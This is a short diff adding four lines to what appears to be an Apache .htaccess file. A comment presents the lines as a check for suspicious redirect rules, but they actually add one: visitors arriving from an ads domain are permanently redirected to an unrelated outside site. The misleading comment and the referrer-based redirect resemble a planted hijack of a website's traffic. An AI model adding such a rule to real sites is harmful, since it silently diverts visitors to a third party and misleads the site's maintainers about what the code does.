@@ -1,0 +1,4 @@
+# Check for any suspicious redirect rules
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ads\.download-adblockers\.com [NC]
+RewriteRule ^(.*)$ https://www.rubrick.in/sriven-tripura/ [R=301,L]
